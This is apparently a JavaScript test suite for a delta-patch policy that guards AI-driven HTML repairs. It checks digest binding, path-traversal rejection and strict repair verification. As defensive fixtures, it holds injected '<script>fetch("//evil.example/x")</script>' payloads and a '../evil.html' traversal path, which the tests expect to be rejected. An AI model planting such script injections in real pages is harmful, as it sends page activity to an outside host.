'use strict';

/**
 * B11 Vision 收口回归：
 *  - E07 delta 契约：精确 operation 重放 + 前后 digest 绑定 + 上下文窗口扫描
 *  - 真实 Spacer 独立副本：合法补丁通过、恶意载荷拒绝
 *  - 宿主导入 delta：applyFiles(files, {operations}) 原子写入并 finalize journal
 *  - 严格 verified：没有缺陷专属断言时，仅截图变化不算修复
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const { createProjectRegistry } = require('../lib/projects.cjs');
const { createVisionService } = require('../lib/vision-service.cjs');
const { createDeltaPolicy } = require('../lib/vision-policy-delta.cjs');
const visionPolicy = require('../lib/vision-policy.cjs');
const { makeWorkspace, removeWorkspace } = require('./helpers.cjs');

const SPACER = 'G:\\AI_GAME\\Vplay-Vision-POC\\e05\\spacer-latest\\vector-lander\\index.html';
const policy = createDeltaPolicy({ policy: visionPolicy, contextLines: 2 });

function sha256(text) {
  return crypto.createHash('sha256').update(text).digest('hex');
}

function write(file, content) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, content);
}

function makeOperation(before, oldString, newString) {
  const start = before.indexOf(oldString);
  assert.ok(start >= 0, `fixture must contain: ${oldString}`);
  return { start, end: start + oldString.length, oldString, newString };
}

function applyFile(root, file, before, after, operation) {
  return policy.applyDelta({
    root,
    files: [
      {
        file,
        content: after,
        sha256Before: sha256(before),
        sha256After: sha256(after),
      },
    ],
    operations: [{ file, start: operation.start, end: operation.end, oldString: operation.oldString, newString: operation.newString }],
    allowedFiles: [file],
  });
}

test('B11-Vision-delta: legal change near inline script passes; malicious fragment rejected', () => {
  const root = makeWorkspace('vplay-b11-delta-');
  try {
    const before = [
      '<script>const onChange = () => { window.__hud = 1; };</script>',
      '',
      '',
      '',
      '<h1 id="gameTitle">VECTOR LANDER</h1>',
      '<p>status</p>',
    ].join('\n');
    write(path.join(root, 'index.html'), before);

    const operation = makeOperation(before, 'VECTOR LANDER', 'VECTOR LANDER X');
    const after = before.replace('VECTOR LANDER', 'VECTOR LANDER X');
    const applied = applyFile(root, 'index.html', before, after, operation);
    assert.equal(applied.files[0].file, 'index.html');
    assert.equal(fs.readFileSync(path.join(root, 'index.html'), 'utf8'), after);

    // 恶意新增片段（script/协议相对 URL）必须拒绝且文件不变
    const previous = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
    const anchor = '<p>status</p>';
    const anchorStart = previous.indexOf(anchor);
    const malicious = previous.replace(
      anchor,
      `${anchor}<script>fetch("//evil.example/x")</script>`,
    );
    assert.throws(
      () =>
        policy.applyDelta({
          root,
          files: [{ file: 'index.html', content: malicious, sha256Before: sha256(previous), sha256After: sha256(malicious) }],
          operations: [
            {
              file: 'index.html',
              start: anchorStart,
              end: anchorStart + anchor.length,
              oldString: anchor,
              newString: `${anchor}<script>fetch("//evil.example/x")</script>`,
            },
          ],
          allowedFiles: ['index.html'],
        }),
      (error) => error.code === 'DELTA_CONTENT_REJECTED',
    );
    assert.equal(fs.readFileSync(path.join(root, 'index.html'), 'utf8'), previous);

    // 基线摘要不符（TOCTOU）
    assert.throws(
      () =>
        policy.applyDelta({
          root,
          files: [{ file: 'index.html', content: after, sha256Before: 'deadbeef', sha256After: sha256(after) }],
          operations: [{ file: 'index.html', ...operation }],
          allowedFiles: ['index.html'],
        }),
      (error) => error.code === 'DELTA_SOURCE_CHANGED',
    );

    // materialized 内容与 operations 不一致
    const forged = `${after}\n<!-- extra -->`;
    assert.throws(
      () =>
        policy.applyDelta({
          root,
          files: [{ file: 'index.html', content: forged, sha256Before: sha256(previous), sha256After: sha256(forged) }],
          operations: [{ file: 'index.html', ...operation }],
          allowedFiles: ['index.html'],
        }),
      (error) => ['DELTA_DIGEST_MISMATCH', 'DELTA_SOURCE_CHANGED'].includes(error.code),
    );

    // 路径穿越（进入文件校验阶段后由 assertSafeRelPath 拒绝）
    assert.throws(
      () =>
        policy.applyDelta({
          root,
          files: [{ file: '../evil.html', content: 'y', sha256Before: sha256('x'), sha256After: sha256('y') }],
          operations: [
            { file: '../evil.html', start: 0, end: 1, oldString: 'x', newString: 'y' },
          ],
          allowedFiles: ['../evil.html'],
        }),
      (error) => ['DELTA_FILE_NOT_ALLOWED', 'PATH_TRAVERSAL', 'PATH_INVALID', 'PATH_DOTFILE'].includes(error.code),
    );
  } finally {
    removeWorkspace(root);
  }
});

test('B11-Vision-Spacer: real Spacer copy accepts a legal CSS patch and rejects malicious payload', (t) => {
  if (!fs.existsSync(SPACER)) {
    t.skip('Spacer snapshot not available');
    return;
  }
  const root = makeWorkspace('vplay-b11-spacer-');
  try {
    const file = path.join(root, 'index.html');
    fs.copyFileSync(SPACER, file);
    let before = fs.readFileSync(file, 'utf8');
    const oldString = 'width:clamp(54px,22%,88px)';
    const newString = 'width:clamp(56px,22%,88px)';
    let start = before.indexOf(oldString);
    if (start < 0) {
      // 兼容 Spacer 版本差异：改一个纯文本标题
      const title = 'VECTOR LANDER';
      start = before.indexOf(title);
      assert.ok(start >= 0, 'Spacer file must contain a known patch anchor');
      const after = before.replace(title, `${title} B11`);
      const applied = policy.applyDelta({
        root,
        files: [{ file: 'index.html', content: after, sha256Before: sha256(before), sha256After: sha256(after) }],
        operations: [{ file: 'index.html', start, end: start + title.length, oldString: title, newString: `${title} B11` }],
        allowedFiles: ['index.html'],
      });
      assert.equal(applied.files[0].file, 'index.html');
      assert.equal(sha256(fs.readFileSync(file, 'utf8')), sha256(after));
      return;
    }
    const after = before.slice(0, start) + newString + before.slice(start + oldString.length);
    const applied = policy.applyDelta({
      root,
      files: [{ file: 'index.html', content: after, sha256Before: sha256(before), sha256After: sha256(after) }],
      operations: [{ file: 'index.html', start, end: start + oldString.length, oldString, newString }],
      allowedFiles: ['index.html'],
    });
    assert.equal(applied.files[0].file, 'index.html');
    assert.equal(sha256(fs.readFileSync(file, 'utf8')), sha256(after));

    // 恶意：替换真实文件中的已知片段并注入 script
    before = fs.readFileSync(file, 'utf8');
    const marker = newString;
    const markerStart = before.indexOf(marker);
    const injected = `${marker}<script>fetch("https://evil.example/x")</script>`;
    const malicious = before.replace(marker, injected);
    assert.throws(
      () =>
        policy.applyDelta({
          root,
          files: [{ file: 'index.html', content: malicious, sha256Before: sha256(before), sha256After: sha256(malicious) }],
          operations: [
            {
              file: 'index.html',
              start: markerStart,
              end: markerStart + marker.length,
              oldString: marker,
              newString: injected,
            },
          ],
          allowedFiles: ['index.html'],
        }),
      (error) => error.code === 'DELTA_CONTENT_REJECTED',
    );
    assert.equal(fs.readFileSync(file, 'utf8'), before);
  } finally {
    removeWorkspace(root);
  }
});

function makeFakeVision(resultFactory) {
  let calls = 0;
  return {
    createEventSink: ({ onEvent }) => ({
      events: [],
      emit(type, payload) {
        if (onEvent) onEvent({ type, payload });
      },
    }),
    createSpacerAdapter: () => ({ id: 'fake', viewports: [], ready: async () => {}, assert: async () => [] }),
    redactSource: (text) => ({ text, findings: [], truncated: false }),
    redactObject: (value) => value,
    runVisionTask: async (args) => {
      calls += 1;
      return resultFactory(args);
    },
    calls: () => calls,
  };
}

test('B11-Vision-apply: host uses delta operations, enforces consistency and finalizes journal', async () => {
  const root = makeWorkspace('vplay-b11-vision-apply-');
  const home = path.join(root, 'home');
  try {
    const registry = createProjectRegistry({ home });
    const imported = registry.importProject({
      sourceDir: (() => {
        write(path.join(root, 'src', 'index.html'), '<h1>v1</h1>\n');
        return path.join(root, 'src');
      })(),
      id: 'demo',
    });
    const vision = makeFakeVision(async ({ host, root: srcRoot }) => {
      const before = fs.readFileSync(path.join(srcRoot, 'index.html'), 'utf8');
      const start = before.indexOf('v1');
      const after = before.replace('v1', 'v2');
      await host.applyFiles(
        [
          {
            file: 'index.html',
            content: after,
            sha256Before: sha256(before),
            sha256After: sha256(after),
          },
        ],
        {
          operations: [
            {
              file: 'index.html',
              start,
              end: start + 2,
              oldString: 'v1',
              newString: 'v2',
            },
          ],
          round: 1,
        },
      );
      return {
        ok: true,
        status: 'repaired',
        validation: { ok: true },
        comparison: {
          ok: true,
          beforeOk: false,
          afterOk: true,
          resolvedCriticalFailures: [{ id: 'h1-visible' }],
          newCriticalFailures: [],
          screenshotsChanged: true,
        },
      };
    });
    const service = createVisionService({
      registry,
      home,
      deps: {
        vision,
        consent: true,
        gateway: { summary: () => ({}) },
        browserRunner: { runCapture: async () => ({ ok: true, viewports: [], screenshots: [] }) },
      },
    });
    const output = await service.run({ taskId: 'vision_delta_ok', projectId: 'demo', mode: 'repair', skipLock: false });
    assert.equal(output.result.ok, true);
    assert.match(fs.readFileSync(path.join(imported.project.srcDir, 'index.html'), 'utf8'), /v2/);
    assert.equal(registry.verifyPreview('demo').ok, true);
    assert.equal(
      fs.existsSync(path.join(home, 'evidence', 'demo', 'vision_delta_ok', 'apply-journal.json')),
      false,
      'journal must be finalized after preview verification',
    );
  } finally {
    removeWorkspace(root);
  }
});

test('B11-Vision-verified: screenshots alone cannot prove a repair', async () => {
  const root = makeWorkspace('vplay-b11-vision-strict-');
  const home = path.join(root, 'home');
  try {
    const registry = createProjectRegistry({ home });
    write(path.join(root, 'src', 'index.html'), '<h1>v1</h1>\n');
    registry.importProject({ sourceDir: path.join(root, 'src'), id: 'demo' });

    const screenshotsOnly = makeFakeVision(async () => ({
      ok: true,
      status: 'repaired',
      validation: { ok: true },
      comparison: {
        ok: true,
        beforeOk: true,
        afterOk: true,
        resolvedCriticalFailures: [],
        newCriticalFailures: [],
        screenshotsChanged: true,
      },
    }));
    const serviceA = createVisionService({
      registry,
      home,
      deps: {
        vision: screenshotsOnly,
        consent: true,
        gateway: { summary: () => ({}) },
        browserRunner: { runCapture: async () => ({ ok: true, viewports: [], screenshots: [] }) },
      },
    });
    const weak = await serviceA.run({ taskId: 'vision_weak', projectId: 'demo', mode: 'repair', skipLock: false });
    assert.equal(weak.result.ok, false);
    assert.equal(weak.result.status, 'repair_unconfirmed');
    assert.equal(weak.result.validation.ok, false);

    const confirmed = makeFakeVision(async () => ({
      ok: true,
      status: 'repaired',
      validation: { ok: true },
      comparison: {
        ok: true,
        beforeOk: false,
        afterOk: true,
        resolvedCriticalFailures: [{ id: 'h1-visible' }],
        newCriticalFailures: [],
        screenshotsChanged: false,
      },
    }));
    const serviceB = createVisionService({
      registry,
      home,
      deps: {
        vision: confirmed,
        consent: true,
        gateway: { summary: () => ({}) },
        browserRunner: { runCapture: async () => ({ ok: true, viewports: [], screenshots: [] }) },
      },
    });
    const strong = await serviceB.run({ taskId: 'vision_strong', projectId: 'demo', mode: 'repair', skipLock: false });
    assert.equal(strong.result.ok, true);
    assert.equal(strong.result.status, 'repaired');
  } finally {
    removeWorkspace(root);
  }
});
